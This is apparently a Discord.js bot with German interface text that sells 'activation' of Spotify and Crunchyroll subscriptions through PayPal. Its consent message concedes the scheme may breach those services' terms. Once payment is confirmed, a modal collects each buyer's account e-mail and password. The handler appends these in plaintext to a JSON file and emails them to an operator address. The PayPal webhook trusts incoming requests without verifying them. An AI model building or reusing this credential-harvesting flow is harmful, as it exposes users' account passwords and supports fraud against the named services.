// Discord.js v14 Bot mit PayPal Webhook-Erkennung und aktivem "Ich habe bezahlt"-Button
const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, Events, REST, Routes, SlashCommandBuilder } = require('discord.js');
const fs = require('fs');
const express = require('express');
const nodemailer = require('nodemailer');
require('dotenv').config();

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
  partials: [Partials.Channel]
});

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
const commands = [
  new SlashCommandBuilder().setName('start').setDescription('Beginnt den Abo-Prozess')
];

(async () => {
  try {
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('✅ Slash-Commands registriert.');
  } catch (err) {
    console.error(err);
  }
})();

client.once('ready', () => {
  console.log(`✅ Bot online als ${client.user.tag}`);
});

let paymentSessions = {}; // Merkt sich wer was gezahlt hat

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

  if (interaction.isChatInputCommand() && interaction.commandName === 'start') {
    const consentRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('consent_accept').setLabel('Ich stimme zu').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('consent_decline').setLabel('Ich lehne ab').setStyle(ButtonStyle.Danger)
    );

    await interaction.reply({
      content: `Bevor wir fortfahren, musst du dein Einverständnis geben:\n
☑️ Deine Daten werden temporär verarbeitet, ausschließlich zur Aktivierung.
☑️ Du verstehst, dass dies gegen die AGB der Dienste verstoßen kann.
☑️ Du hast dein Passwort vor dem Prozess geändert und änderst es danach wieder.
☑️ Keine aktiven Abos auf deinem Account vorhanden.`,
      components: [consentRow],
      ephemeral: true
    });
  }

  if (interaction.isButton()) {
    if (interaction.customId === 'consent_decline') {
      await interaction.update({ content: '❌ Vorgang abgebrochen.', components: [] });
      return;
    }

    if (interaction.customId === 'consent_accept') {
      const serviceRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('choose_spotify').setLabel('Spotify (30 €)').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('choose_crunchyroll').setLabel('Crunchyroll (40 €)').setStyle(ButtonStyle.Secondary)
      );

      await interaction.update({
        content: '✅ Zustimmung erhalten. Bitte wähle nun deinen Dienst:',
        components: [serviceRow]
      });
    }

    if (interaction.customId.startsWith('choose_')) {
      const service = interaction.customId === 'choose_spotify' ? 'Spotify' : 'Crunchyroll';
      paymentSessions[interaction.user.id] = { service, paid: false };

      await interaction.update({
        content: `ℹ️ Du hast **${service}** gewählt. Bitte zahle den Betrag via PayPal:
🔗 [Dein PayPal-Link hier einfügen]

Wir aktivieren den "Ich habe bezahlt"-Button automatisch, sobald deine Zahlung bestätigt ist.`,
        components: []
      });
    }

    if (interaction.customId.startsWith('paid_continue_')) {
      const session = paymentSessions[interaction.user.id];
      if (!session || !session.paid) {
        await interaction.reply({ content: '⏳ Zahlung noch nicht bestätigt. Bitte warte einen Moment oder prüfe deinen PayPal-Zahlstatus.', ephemeral: true });
        return;
      }

      const modal = new ModalBuilder()
        .setCustomId(`login_modal_${session.service.toLowerCase()}`)
        .setTitle(`${session.service} Zugangsdaten`)
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('email_input').setLabel('E-Mail oder Benutzername').setStyle(TextInputStyle.Short).setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('password_input').setLabel('Passwort').setStyle(TextInputStyle.Short).setRequired(true)
          )
        );

      await interaction.showModal(modal);
    }
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('login_modal_')) {
    const service = interaction.customId.split('_')[2];
    const email = interaction.fields.getTextInputValue('email_input');
    const password = interaction.fields.getTextInputValue('password_input');

    const logEntry = {
      timestamp: new Date().toISOString(),
      user: interaction.user.tag,
      userId: interaction.user.id,
      service,
      email,
      password
    };
    fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
      if (err) console.error('Fehler beim Speichern:', err);
    });

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.MAIL_USER, pass: process.env.MAIL_PASS }
    });

    const mailOptions = {
      from: process.env.MAIL_USER,
      to: process.env.NOTIFY_TO,
      subject: `📬 Neue Bestellung: ${service}`,
      html: `<h2>Neue Bestellung</h2><p><strong>User:</strong> ${interaction.user.tag}</p><p><strong>Email:</strong> ${email}</p><p><strong>Passwort:</strong> ${password}</p>`
    };

    transporter.sendMail(mailOptions, (err, info) => {
      if (err) console.error('E-Mail-Fehler:', err);
      else console.log('Benachrichtigung gesendet:', info.response);
    });

    await interaction.reply({ content: `✅ Daten für **${service}** empfangen. Vielen Dank!`, ephemeral: true });
  }
});

// Express Server für PayPal Webhook
const app = express();
app.use(express.json());

app.post('/paypal-webhook', (req, res) => {
  const event = req.body;

  if (event.event_type === 'CHECKOUT.ORDER.APPROVED') {
    const payerEmail = event.resource.payer.email_address;
    console.log(`💰 Zahlung erhalten: ${payerEmail}`);

    client.users.fetch(event.resource.custom_id).then(user => {
      if (user && paymentSessions[user.id]) {
        paymentSessions[user.id].paid = true;

        user.send({
          content: `✅ Zahlung bestätigt! Du kannst nun fortfahren.`,
          components: [
            new ActionRowBuilder().addComponents(
              new ButtonBuilder()
                .setCustomId(`paid_continue_${paymentSessions[user.id].service.toLowerCase()}`)
                .setLabel('Ich habe bezahlt')
                .setStyle(ButtonStyle.Success)
            )
          ]
        });
      }
    }).catch(console.error);
  }

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log('🌐 Webhook-Server aktiv auf Port 3000');
});

client.login(process.env.TOKEN);
